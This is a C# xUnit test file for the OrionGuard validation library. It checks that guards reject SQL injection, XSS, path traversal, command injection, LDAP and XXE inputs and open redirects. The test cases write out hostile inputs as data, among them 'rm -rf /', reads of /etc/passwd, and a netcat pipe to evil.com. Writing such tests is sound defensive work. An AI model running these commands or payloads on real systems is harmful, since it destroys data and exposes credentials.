using Moongazing.OrionGuard.Extensions;

namespace Moongazing.OrionGuard.Tests;

public class SecurityGuardsTests
{
    #region AgainstSqlInjection

    [Theory]
    [InlineData("SELECT * FROM Users")]
    [InlineData("'; DROP TABLE Users;--")]
    [InlineData("UNION SELECT password FROM users")]
    [InlineData("admin' OR '1'='1'; EXEC xp_cmdshell")]
    [InlineData("1; TRUNCATE TABLE orders")]
    [InlineData("WAITFOR DELAY '00:00:10'")]
    [InlineData("DECLARE @cmd NVARCHAR(100)")]
    public void AgainstSqlInjection_ShouldThrow_WhenInputContainsSqlPatterns(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstSqlInjection(nameof(input)));
    }

    [Theory]
    [InlineData("John Doe")]
    [InlineData("tunahan@example.com")]
    [InlineData("My product description")]
    [InlineData("")]
    [InlineData(null)]
    public void AgainstSqlInjection_ShouldNotThrow_WhenInputIsSafe(string? input)
    {
        var exception = Record.Exception(() => input!.AgainstSqlInjection(nameof(input)));
        Assert.Null(exception);
    }

    #endregion

    #region AgainstXss

    [Theory]
    [InlineData("<script>alert('xss')</script>")]
    [InlineData("<img onerror=alert(1)>")]
    [InlineData("javascript:void(0)")]
    [InlineData("<iframe src='evil.com'>")]
    [InlineData("document.cookie")]
    [InlineData("window.location='evil.com'")]
    [InlineData("<embed src='evil'>")]
    public void AgainstXss_ShouldThrow_WhenInputContainsXssPatterns(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstXss(nameof(input)));
    }

    [Theory]
    [InlineData("Hello World")]
    [InlineData("A perfectly normal sentence.")]
    [InlineData("")]
    [InlineData(null)]
    public void AgainstXss_ShouldNotThrow_WhenInputIsSafe(string? input)
    {
        var exception = Record.Exception(() => input!.AgainstXss(nameof(input)));
        Assert.Null(exception);
    }

    #endregion

    #region AgainstPathTraversal

    [Theory]
    [InlineData("../../etc/passwd")]
    [InlineData("..\\..\\Windows\\System32")]
    [InlineData("%2e%2e%2f")]
    [InlineData("/etc/passwd")]
    [InlineData("C:\\Windows")]
    public void AgainstPathTraversal_ShouldThrow_WhenInputContainsTraversalPatterns(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstPathTraversal(nameof(input)));
    }

    [Theory]
    [InlineData("images/photo.jpg")]
    [InlineData("documents/report.pdf")]
    [InlineData("")]
    [InlineData(null)]
    public void AgainstPathTraversal_ShouldNotThrow_WhenInputIsSafe(string? input)
    {
        var exception = Record.Exception(() => input!.AgainstPathTraversal(nameof(input)));
        Assert.Null(exception);
    }

    #endregion

    #region AgainstCommandInjection

    [Theory]
    [InlineData("file; rm -rf /")]
    [InlineData("input && cat /etc/passwd")]
    [InlineData("test | nc evil.com 1234")]
    [InlineData("$(cat /etc/passwd)")]
    [InlineData("file `whoami`")]
    [InlineData("cmd.exe /c dir")]
    [InlineData("powershell Get-Process")]
    public void AgainstCommandInjection_ShouldThrow_WhenInputContainsCommandPatterns(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstCommandInjection(nameof(input)));
    }

    [Theory]
    [InlineData("Hello World")]
    [InlineData("normal-file-name.txt")]
    [InlineData("")]
    [InlineData(null)]
    public void AgainstCommandInjection_ShouldNotThrow_WhenInputIsSafe(string? input)
    {
        var exception = Record.Exception(() => input!.AgainstCommandInjection(nameof(input)));
        Assert.Null(exception);
    }

    #endregion

    #region AgainstLdapInjection

    [Theory]
    [InlineData("admin)(objectClass=*)")]
    [InlineData("user*")]
    [InlineData("cn=test\\00")]
    [InlineData("ou=test\0")]
    public void AgainstLdapInjection_ShouldThrow_WhenInputContainsLdapPatterns(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstLdapInjection(nameof(input)));
    }

    [Theory]
    [InlineData("john.doe")]
    [InlineData("admin-user")]
    [InlineData("")]
    [InlineData(null)]
    public void AgainstLdapInjection_ShouldNotThrow_WhenInputIsSafe(string? input)
    {
        var exception = Record.Exception(() => input!.AgainstLdapInjection(nameof(input)));
        Assert.Null(exception);
    }

    #endregion

    #region AgainstXxe

    [Theory]
    [InlineData("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>")]
    [InlineData("<!DOCTYPE test [<!ENTITY xxe \"test\">]>")]
    public void AgainstXxe_ShouldThrow_WhenInputContainsXxePatterns(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstXxe(nameof(input)));
    }

    [Theory]
    [InlineData("<root><item>value</item></root>")]
    [InlineData("Just normal text")]
    [InlineData("")]
    [InlineData(null)]
    public void AgainstXxe_ShouldNotThrow_WhenInputIsSafe(string? input)
    {
        var exception = Record.Exception(() => input!.AgainstXxe(nameof(input)));
        Assert.Null(exception);
    }

    #endregion

    #region AgainstInjection (Combined)

    [Theory]
    [InlineData("SELECT * FROM Users")]
    [InlineData("<script>alert(1)</script>")]
    [InlineData("../../etc/passwd")]
    [InlineData("test; rm -rf /")]
    public void AgainstInjection_ShouldThrow_WhenInputContainsAnyInjectionPattern(string input)
    {
        Assert.Throws<ArgumentException>(() => input.AgainstInjection(nameof(input)));
    }

    [Fact]
    public void AgainstInjection_ShouldNotThrow_WhenInputIsSafe()
    {
        var input = "A perfectly safe string with no injection patterns";
        var exception = Record.Exception(() => input.AgainstInjection(nameof(input)));
        Assert.Null(exception);
    }

    #endregion

    #region AgainstUnsafeFileName

    [Theory]
    [InlineData("../../evil.exe")]
    [InlineData("")]
    [InlineData("   ")]
    [InlineData(null)]
    public void AgainstUnsafeFileName_ShouldThrow_WhenFileNameIsUnsafe(string? input)
    {
        Assert.Throws<ArgumentException>(() => input!.AgainstUnsafeFileName(nameof(input)));
    }

    [Theory]
    [InlineData("report.pdf")]
    [InlineData("my-image.png")]
    [InlineData("document_v2.docx")]
    public void AgainstUnsafeFileName_ShouldNotThrow_WhenFileNameIsSafe(string input)
    {
        var exception = Record.Exception(() => input.AgainstUnsafeFileName(nameof(input)));
        Assert.Null(exception);
    }

    #endregion

    #region AgainstOpenRedirect

    [Fact]
    public void AgainstOpenRedirect_ShouldThrow_WhenRedirectToUntrustedDomain()
    {
        var url = "https://evil.com/phishing";
        Assert.Throws<ArgumentException>(() => url.AgainstOpenRedirect(nameof(url), "example.com", "trusted.com"));
    }

    [Fact]
    public void AgainstOpenRedirect_ShouldNotThrow_WhenRedirectToAllowedDomain()
    {
        var url = "https://example.com/dashboard";
        var exception = Record.Exception(() => url.AgainstOpenRedirect(nameof(url), "example.com"));
        Assert.Null(exception);
    }

    [Fact]
    public void AgainstOpenRedirect_ShouldThrow_WhenProtocolRelativeUrl()
    {
        // Protocol-relative URLs parsed as absolute by .NET - need allowedDomains to trigger domain check
        var url = "//evil.com/phishing";
        Assert.Throws<ArgumentException>(() => url.AgainstOpenRedirect(nameof(url), "safe.com"));
    }

    [Theory]
    [InlineData("")]
    [InlineData(null)]
    public void AgainstOpenRedirect_ShouldNotThrow_WhenNullOrEmpty(string? input)
    {
        var exception = Record.Exception(() => input!.AgainstOpenRedirect(nameof(input)));
        Assert.Null(exception);
    }

    #endregion
}
